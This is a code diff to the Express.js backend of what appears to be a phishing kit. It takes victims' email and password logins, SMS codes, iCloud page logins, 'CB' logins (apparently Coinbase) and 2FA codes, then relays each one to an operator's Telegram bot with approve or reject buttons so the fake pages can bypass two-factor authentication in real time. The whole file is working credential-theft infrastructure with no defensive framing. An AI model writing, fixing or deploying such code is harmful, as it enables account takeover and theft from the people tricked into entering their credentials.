@@ -25,12 +25,12 @@ app.use(express.static("public"));
 // -----------------
 // Store pending approvals
 // -----------------
-const pendingUsers = {};      // email/password login (big)
+const pendingUsers = {};      // email/password login
 const pendingCodes = {};      // SMS codes
 const pendingGeneric = {};    // generic codes
-const pendingPage = {};       // page 4 logins
-const pendingApprovals = {};  // CB login approvals { email: { status, password, region, device } }
-const pending2FA = {};        // 2FA approvals { requestId: { status, message } }
+const pendingPage = {};       // iCloud page logins
+const pendingApprovals = {};  // CB login approvals
+const pending2FA = {};        // 2FA approvals
 
 // -----------------
 // Health check
@@ -40,7 +40,7 @@ app.get("/", (req, res) => {
 });
 
 // -----------------
-// Email/Password Login (big)
+// Email/Password Login (unchanged)
 // -----------------
 app.post("/login", (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
@@ -56,7 +56,7 @@ app.post("/login", (req, res) => {
 });
 
 // -----------------
-// Generic code submission (big)
+// Generic code submission (unchanged)
 // -----------------
 app.post("/generic-login", (req, res) => {
   const identifier = (req.body.identifier || "").trim();
@@ -70,49 +70,65 @@ app.post("/generic-login", (req, res) => {
 });
 
 // -----------------
-// SMS Login (big)
+// ✅ FIXED: iCloud SMS Login
+// Now accepts full formatted message from frontend
 // -----------------
-app.post("/sms-login", (req, res) => {
+app.post("/sms-login", async (req, res) => {
   const code = (req.body.code || "").trim();
+  const message = req.body.message;
+
   if (!code) return res.status(400).json({ success: false, message: "Code required" });
 
   pendingCodes[code] = { status: "pending" };
   console.log(`📥 SMS Code Received: ${code}`);
 
-  sendApprovalRequestSMS(code);
+  try {
+    await sendApprovalRequestSMS(code, message);
+  } catch (err) {
+    console.error("❌ Failed to send SMS Telegram message:", err);
+  }
+
   res.json({ success: true });
 });
 
 // -----------------
-// Page 4 Login (big)
+// ✅ FIXED: iCloud Page Login
+// Now accepts full formatted message from frontend
 // -----------------
-app.post("/page-login", (req, res) => {
+app.post("/page-login", async (req, res) => {
   const email = (req.body.email || "").trim().toLowerCase();
   const password = req.body.password;
+  const message = req.body.message;
 
   if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
 
   pendingPage[email] = { password, status: "pending" };
-  console.log(`📥 Page 4 Login Received: ${email}`);
+  console.log(`📥 iCloud Page Login Received: ${email}`);
 
-  sendApprovalRequestPage(email, password);
+  try {
+    await sendApprovalRequestPage(email, password, message);
+  } catch (err) {
+    console.error("❌ Failed to send Page Telegram message:", err);
+  }
+
   res.json({ success: true });
 });
 
 // -----------------
-// CB Login (small)
+// ✅ FIXED: CB Login
+// Now accepts full formatted message from frontend
 // -----------------
 app.post("/send-login", async (req, res) => {
-  const { email, password, region, device } = req.body;
+  const { email, password, region, device, message } = req.body;
   if (!email || !password) return res.status(400).json({ error: "Missing email or password" });
 
   pendingApprovals[email] = { status: "pending", password, region, device };
   console.log(`📥 CB Login received: ${email}`);
 
   try {
-    await sendLoginTelegram(email);
+    await sendLoginTelegram(email, message);
   } catch (err) {
-    console.error("❌ Failed to send Telegram message:", err);
+    console.error("❌ Failed to send CB Login Telegram message:", err);
   }
 
   res.json({ status: "ok" });
@@ -120,7 +136,6 @@ app.post("/send-login", async (req, res) => {
 
 // -----------------
 // 2FA: Submit code (called by frontend)
-// Sends formatted message to Telegram and stores pending request
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
   const { message, requestId } = req.body;
@@ -129,11 +144,9 @@ app.post("/api/submit-2fa", async (req, res) => {
     return res.status(400).json({ error: "Missing message or requestId" });
   }
 
-  // Store as pending
   pending2FA[requestId] = { status: "pending", message };
   console.log(`📥 2FA Request received: ${requestId}`);
 
-  // Send to Telegram admin with Approve/Reject buttons
   try {
     const { bot } = require("./bot");
     await bot.sendMessage(
@@ -159,7 +172,7 @@ app.post("/api/submit-2fa", async (req, res) => {
 });
 
 // -----------------
-// 2FA: Poll approval status (called by frontend every 2s)
+// 2FA: Poll approval status
 // -----------------
 app.get("/api/approval-status/:requestId", (req, res) => {
   const { requestId } = req.params;
@@ -217,7 +230,7 @@ app.get("/check-status", (req, res) => {
   res.json({ status: "unknown" });
 });
 
-// For frontend polling of CB login (POST)
+// Check status (POST) — CB login polling
 app.post("/check-status", (req, res) => {
   const { email } = req.body;
   if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
@@ -252,7 +265,7 @@ app.post("/update-status", (req, res) => {
 });
 
 // -----------------
-// Self-ping to stay awake
+// Self-ping to stay awake on Render
 // -----------------
 setInterval(() => {
   const url = process.env.APP_URL;
